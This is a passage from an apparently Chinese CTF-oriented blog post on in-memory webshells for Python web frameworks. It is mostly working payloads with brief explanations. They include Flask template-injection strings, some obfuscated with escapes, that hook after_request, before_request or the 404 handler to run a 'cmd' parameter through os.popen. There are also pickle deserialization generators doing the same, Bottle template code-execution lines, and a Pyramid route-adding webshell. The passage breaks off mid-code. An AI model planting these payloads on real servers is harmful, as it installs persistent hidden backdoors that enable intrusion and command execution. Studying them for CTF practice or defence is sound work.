+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">get_flashed_messages|attr(&#34;\x5f\x5fgetattribute\x5f\x5f&#34;)(&#34;\x5f\x5fglobals\x5f\x5f&#34;)|attr(&#34;\x5f\x5fgetattribute\x5f\x5f&#34;)(&#34;\x5f\x5fgetitem\x5f\x5f&#34;)(&#34;__builtins__&#34;)|attr(&#34;\x5f\x5fgetattribute\x5f\x5f&#34;)(&#34;\x5f\x5fgetitem\x5f\x5f&#34;)(&#34;\u0065\u0076\u0061\u006c&#34;)(&#34;app.add_ur&#34;+&#34;l_rule(&#39;/h3rmesk1t&#39;, &#39;h3rmesk1t&#39;, la&#34;+&#34;mbda :__imp&#34;+&#34;ort__(&#39;o&#34;+&#34;s&#39;).po&#34;+&#34;pen(_request_c&#34;+&#34;tx_stack.to&#34;+&#34;p.re&#34;+&#34;quest.args.get(&#39;shell&#39;)).re&#34;+&#34;ad())&#34;,{&#39;\u005f\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u005f\u0063\u0074\u0078\u005f\u0073\u0074\u0061\u0063\u006b&#39;:get_flashed_messages|attr(&#34;\x5f\x5fgetattribute\x5f\x5f&#34;)(&#34;\x5f\x5fglobals\x5f\x5f&#34;)|attr(&#34;\x5f\x5fgetattribute\x5f\x5f&#34;)(&#34;\x5f\x5fgetitem\x5f\x5f&#34;)(&#34;\u005f\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u005f\u0063\u0074\u0078\u005f\u0073\u0074\u0061\u0063\u006b&#34;),&#39;app&#39;:get_flashed_messages|attr(&#34;\x5f\x5fgetattribute\x5f\x5f&#34;)(&#34;\x5f\x5fglobals\x5f\x5f&#34;)|attr(&#34;\x5f\x5fgetattribute\x5f\x5f&#34;)(&#34;\x5f\x5fgetitem\x5f\x5f&#34;)(&#34;\u0063\u0075\u0072\u0072\u0065\u006e\u0074\u005f\u0061\u0070\u0070&#34;)})
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="新版flask内存马">新版Flask内存马
+</h4><p>在极客2024的复现中遇到了pickle打内存马的，而且老版的<code>add_url_rule</code>函数已经不支持用于注册路由了，来记录一下</p>
+<p>首先是ssti的</p>
+<p>用了<code>after_request</code>钩子函数在当前页面添加恶意回调函数，在每次请求过后都会调用一次。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="p">{{</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span><span class="s2">&#34;app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#39;cmd&#39;) and exec(</span><span class="se">\&#34;</span><span class="s2">global CmdResp;CmdResp=__import__(</span><span class="se">\&#39;</span><span class="s2">flask</span><span class="se">\&#39;</span><span class="s2">).make_response(__import__(</span><span class="se">\&#39;</span><span class="s2">os</span><span class="se">\&#39;</span><span class="s2">).popen(request.args.get(</span><span class="se">\&#39;</span><span class="s2">cmd</span><span class="se">\&#39;</span><span class="s2">)).read())</span><span class="se">\&#34;</span><span class="s2">)==None else resp)&#34;</span><span class="p">,{</span><span class="s1">&#39;request&#39;</span><span class="p">:</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;request&#39;</span><span class="p">],</span><span class="s1">&#39;app&#39;</span><span class="p">:</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;sys&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s1">&#39;__main__&#39;</span><span class="p">]</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">[</span><span class="s1">&#39;app&#39;</span><span class="p">]})}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="p">{{</span> 
+</span></span><span class="line"><span class="cl">  <span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#39;cmd&#39;) and exec(</span><span class="se">\&#34;</span><span class="s2">global CmdResp;CmdResp=__import__(</span><span class="se">\&#39;</span><span class="s2">flask</span><span class="se">\&#39;</span><span class="s2">).make_response(__import__(</span><span class="se">\&#39;</span><span class="s2">os</span><span class="se">\&#39;</span><span class="s2">).popen(request.args.get(</span><span class="se">\&#39;</span><span class="s2">cmd</span><span class="se">\&#39;</span><span class="s2">)).read())</span><span class="se">\&#34;</span><span class="s2">)==None else resp)&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="s1">&#39;request&#39;</span><span class="p">:</span> <span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;request&#39;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">      <span class="s1">&#39;app&#39;</span><span class="p">:</span> <span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;sys&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s1">&#39;__main__&#39;</span><span class="p">]</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">[</span><span class="s1">&#39;app&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>我们来解析一下：</p>
+<p>首先是<code>url_for.__globals__['__builtins__']['eval']</code>这个就不多说了。</p>
+<p>然后是包裹在cmd中的<code>app.after_request_funcs.setdefault(None, []).append(...)</code> 这个函数解析如下，作用是注册<strong>后处理</strong>钩子</p>
+<ul>
+<li><code>after_request_funcs</code>：Flask 的请求后处理回调列表</li>
+<li><code>setdefault(None, [])</code>：为全局回调创建空列表</li>
+<li><code>append(...)</code>：添加恶意回调函数</li>
+</ul>
+<p>然后就是添加的回调函数lambda，内容是如果存在cmd参数并，返回带有命令执行的响应，若不存在cmd参数，就返回原来的参数。</p>
+<p>当然不止这一种钩子函数可以用，也可以通过<code>error_handler</code>注册所有404页面成为内存马，太帅了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="p">{{</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span><span class="s2">&#34;exec(</span><span class="se">\&#34;</span><span class="s2">global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#39;os&#39;).popen(request.args.get(&#39;cmd&#39;)).read()</span><span class="se">\&#34;</span><span class="s2">)&#34;</span><span class="p">,{</span><span class="s1">&#39;request&#39;</span><span class="p">:</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;request&#39;</span><span class="p">],</span><span class="s1">&#39;app&#39;</span><span class="p">:</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;sys&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s1">&#39;__main__&#39;</span><span class="p">]</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">[</span><span class="s1">&#39;app&#39;</span><span class="p">]})}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="p">{{</span> <span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;exec(</span><span class="se">\&#34;</span><span class="s2">global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#39;os&#39;).popen(request.args.get(&#39;cmd&#39;)).read()</span><span class="se">\&#34;</span><span class="s2">)&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span><span class="s1">&#39;request&#39;</span><span class="p">:</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;request&#39;</span><span class="p">],</span><span class="s1">&#39;app&#39;</span><span class="p">:</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;sys&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s1">&#39;__main__&#39;</span><span class="p">]</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">[</span><span class="s1">&#39;app&#39;</span><span class="p">]}</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span> <span class="p">}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>直接分析exec中的部分</p>
+<p><code>exc_class, code = app._get_exc_class_and_code(404);</code></p>
+<ul>
+<li><strong>作用</strong>：获取处理 HTTP 404 错误所需的具体异常类和状态码。</li>
+<li><code>app</code>：就是前面获取的 Flask 应用实例。</li>
+<li><code>_get_exc_class_and_code(404)</code>：这是 Flask 的一个内部方法。调用它会返回一个元组，例如 <code>(werkzeug.exceptions.NotFound, 404)</code>。</li>
+<li>所以，执行后 <code>exc_class</code> 变量会是 <code>NotFound</code> 这个异常类，<code>code</code> 变量会是整数 <code>404</code>。</li>
+</ul>
+<p><code>app.error_handler_spec[None][code][exc_class] = ...</code></p>
+<ul>
+<li><strong>作用</strong>：定位并准备<strong>覆盖</strong> Flask 的 404 错误处理器。</li>
+<li><code>app.error_handler_spec</code>：这是 Flask 内部用来存储所有错误处理函数的一个字典。它的结构大致是 <code>[蓝图名称][状态码][异常类]</code>。</li>
+<li><code>[None]</code>：表示我们修改的是全局的错误处理器，而不是某个特定蓝图（Blueprint）的。</li>
+<li><code>[code]</code>：就是 <code>[404]</code>。</li>
+<li><code>[exc_class]</code>：就是 <code>[werkzeug.exceptions.NotFound]</code>。</li>
+<li><strong>连起来看</strong>：这行代码精确定位到了 Flask 应用中负责处理“404 Not Found”错误的那个函数指针。</li>
+</ul>
+<p><code>= lambda a: __import__('os').popen(request.args.get('cmd')).read()</code></p>
+<p>这个比较简单就不讲了</p>
+<p>当然有after_request就有before_request，这里尝试照葫芦画瓢手搓一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="p">{{</span> 
+</span></span><span class="line"><span class="cl">  <span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;app.before_request_funcs.setdefault(None, []).append(lambda: request.args.get(&#39;cmd&#39;) and __import__(&#39;os&#39;).popen(request.args.get(&#39;cmd&#39;)).read())&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="s1">&#39;request&#39;</span><span class="p">:</span> <span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;request&#39;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">      <span class="s1">&#39;app&#39;</span><span class="p">:</span> <span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;sys&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s1">&#39;__main__&#39;</span><span class="p">]</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">[</span><span class="s1">&#39;app&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后是通过pickle实现，这里就直接贴代码了，实现思路也大差不差。</p>
+<p><code>error_handler</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">A</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="n">exec</span><span class="p">,(</span><span class="s2">&#34;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#39;os&#39;).popen(request.args.get(&#39;cmd&#39;)).read()&#34;</span><span class="p">,))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="n">A</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">b</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">b</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>after_request</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">A</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="nb">eval</span><span class="p">,(</span><span class="s2">&#34;__import__(&#39;sys&#39;).modules[&#39;__main__&#39;].__dict__[&#39;app&#39;].after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#39;shell&#39;) and exec(</span><span class="se">\&#34;</span><span class="s2">global CmdResp;CmdResp=__import__(</span><span class="se">\&#39;</span><span class="s2">flask</span><span class="se">\&#39;</span><span class="s2">).make_response(__import__(</span><span class="se">\&#39;</span><span class="s2">os</span><span class="se">\&#39;</span><span class="s2">).popen(request.args.get(</span><span class="se">\&#39;</span><span class="s2">cmd</span><span class="se">\&#39;</span><span class="s2">)).read())</span><span class="se">\&#34;</span><span class="s2">)==None else resp)&#34;</span><span class="p">,))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="n">A</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">b</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">b</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>before_request</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">A</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="nb">eval</span><span class="p">,(</span><span class="s2">&#34;__import__(</span><span class="se">\&#34;</span><span class="s2">sys</span><span class="se">\&#34;</span><span class="s2">).modules[&#39;__main__&#39;].__dict__[&#39;app&#39;].before_request_funcs.setdefault(None, []).append(lambda :__import__(&#39;os&#39;).popen(request.args.get(&#39;cmd&#39;)).read())&#34;</span><span class="p">,))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="n">A</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">b</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">b</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="小结-1">小结
+</h4><p>​	python flask  内存马到这也就差不多了，主要能使用的地方是一些无回显的ssti，或者反序列化，可以搭配packle反序列化一起食用。最后附上文章</p>
+<p><a class="link" href="https://xz.aliyun.com/news/10381"  target="_blank" rel="noopener"
+    >Python 内存马分析-先知社区</a></p>
+<h3 id="python-bottle-ssti内存马">python bottle ssti内存马
+</h3><p>​	不同的框架，内存马的格式也不一样，先简单介绍一下bottle框架</p>
+<h4 id="bottle框架漏洞">bottle框架漏洞
+</h4><p>​	<strong>bottle</strong>是一个轻量级的 <code>Python Web</code>单文件框架，仅包含一个 <em><strong>py</strong></em>文件，不依赖外部库，适用于小型 Web 应用和嵌入式系统开发。它提供了路由、模板、请求处理等基本功能，适合快速构建简单的 Web 应用。</p>
+<p>​	bottle的安全问题主要是因为在<code>SimpleTemplate</code>模板引擎的使用上</p>
+<p>​	<code>SimpleTemplate</code>模板下执行代码有以下几种方式：</p>
+<p><strong><code>{{}} 花括号</code></strong> 只能执行单行表达式。 但是不用分隔符分隔</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">  {{ __import__(&#39;os&#39;).popen(&#39;whoami&#39;).read() }}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong><code>{{! }}</code></strong> 只能执行单行表达式。也不用分隔符分隔</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{!__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read() }}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong><code>换行后%</code></strong> 之后换行与html分割</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">% __import__(&#39;os&#39;).system(&#39;calc&#39;)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>执行多行python表达式如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">% import os  % os.system(&#34;id&#34;)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>**<code>&lt;% ···%&gt;</code>**块级代码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%    import os    os.system(&#34;id&#34;)  %&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>​	用这些包裹ssti的pyload就可以在bottle框架中进行ssti了</p>
+<h4 id="原理-2">原理
+</h4><p>​	先给个实例，这里用代码打或者抓包再自行编码才行，直接打进去的直接把环境打爆了</p>
+<p><img src="/p/%E5%86%85%E5%AD%98%E9%A9%AC/image-20250514152358510.png"
+	width="1581"
+	height="985"
+	srcset="/p/%E5%86%85%E5%AD%98%E9%A9%AC/image-20250514152358510_hu10582133592181868995.png 480w, /p/%E5%86%85%E5%AD%98%E9%A9%AC/image-20250514152358510_hu18057219230680742555.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250514152358510"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="160"
+		data-flex-basis="385px"
+	
+></p>
+<p><img src="/p/%E5%86%85%E5%AD%98%E9%A9%AC/image-20250514150935788.png"
+	width="1182"
+	height="559"
+	srcset="/p/%E5%86%85%E5%AD%98%E9%A9%AC/image-20250514150935788_hu4230591794626427286.png 480w, /p/%E5%86%85%E5%AD%98%E9%A9%AC/image-20250514150935788_hu3585040836488469633.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250514150935788"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="211"
+		data-flex-basis="507px"
+	
+></p>
+<p><img src="/p/%E5%86%85%E5%AD%98%E9%A9%AC/image-20250514150824553.png"
+	width="737"
+	height="164"
+	srcset="/p/%E5%86%85%E5%AD%98%E9%A9%AC/image-20250514150824553_hu10149737826717167557.png 480w, /p/%E5%86%85%E5%AD%98%E9%A9%AC/image-20250514150824553_hu7197931446710047688.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250514150824553"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="449"
+		data-flex-basis="1078px"
+	
+></p>
+<p>​	给个pyload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">% from bottle import Bottle, request
+</span></span><span class="line"><span class="cl">% app=__import__(&#39;sys&#39;).modules[&#39;__main__&#39;].__dict__[&#39;app&#39;]
+</span></span><span class="line"><span class="cl">% app.route(&#34;/shell&#34;,&#34;GET&#34;,lambda :__import__(&#39;os&#39;).popen(request.params.get(&#39;cmd&#39;)).read())
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>​	根据上文写的换行后% 代码注入方式，我们写入内存马。</p>
+<p>​	首先是引用bottle库</p>
+<p>​	然后获取app，看看ai的解释。</p>
+<p><img src="/p/%E5%86%85%E5%AD%98%E9%A9%AC/image-20250514144749971.png"
+	width="1325"
+	height="506"
+	srcset="/p/%E5%86%85%E5%AD%98%E9%A9%AC/image-20250514144749971_hu529675800964412370.png 480w, /p/%E5%86%85%E5%AD%98%E9%A9%AC/image-20250514144749971_hu13556094793288763035.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250514144749971"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="261"
+		data-flex-basis="628px"
+	
+></p>
+<p>​	最后的用lambda匿名函数的话也很简单，上文也详细的讲过。</p>
+<h4 id="小结-2">小结
+</h4><p>​	所以bottle的内存马还是比较简单的，就到这里为止</p>
+<h3 id="python-pyramid-内存马">python Pyramid 内存马
+</h3><p>​	打tg复现的时候遇到了，这里学习一下</p>
+<h4 id="原理-3">原理
+</h4><p>​	还是先贴payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">config.add_route(&#39;shell_route&#39;,&#39;/shell&#39;);config.add_view(lambda request:Response(__import__(&#39;os&#39;).popen(request.params.get(&#39;cmd&#39;)).read()),route_name=&#39;shell_route&#39;);app = config.make_wsgi_app()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>​	不一样的是这里并不是模板注入而是exec()的利用，用于打无回显。</p>
+<p>​	首先</p>
+<p><code>config.add_route('shell_route', '/shell');</code></p>
+<p>​	用于添加一段路由，名字是shell_route，绑定到/shell。</p>
+<p>​	然后是</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">config.add_view(
+</span></span><span class="line"><span class="cl">    lambda request: Response(
+</span></span><span class="line"><span class="cl">        __import__(&#39;os&#39;).popen(request.params.get(&#39;cmd&#39;)).read()
+</span></span><span class="line"><span class="cl">    ),
+</span></span><span class="line"><span class="cl">    route_name=&#39;shell_route&#39;
+</span></span><span class="line"><span class="cl">);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>为路由添加处理函数</p>
+<p><code>lambda request: Response</code>：用lambda匿名函数直接处理请求并返回结果</p>
+<p><code>__import__('os').popen(request.params.get('cmd')).read()</code>：用于get参数cmd，实现rce</p>
+<p>最后 <code>route_name='shell_route'</code>没什么好说的</p>
+<p>这里是一个很简易的内存马，还有一个比较复杂的，不过关键点是一样的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import sys
